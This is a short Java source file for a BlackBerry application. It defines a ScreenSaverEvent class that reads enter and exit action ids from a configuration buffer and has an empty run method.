package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;

public class ScreenSaverEvent extends Event {
    int actionOnEnter;
    int actionOnExit;

    public ScreenSaverEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_SCREENSAVER, actionId, confParams);
        setPeriod(NEVER);
    }

    protected boolean parse(byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();
        } catch (final EOFException e) {
            return false;
        }
        return true;
    }

    protected void actualRun() {
        
    }

}
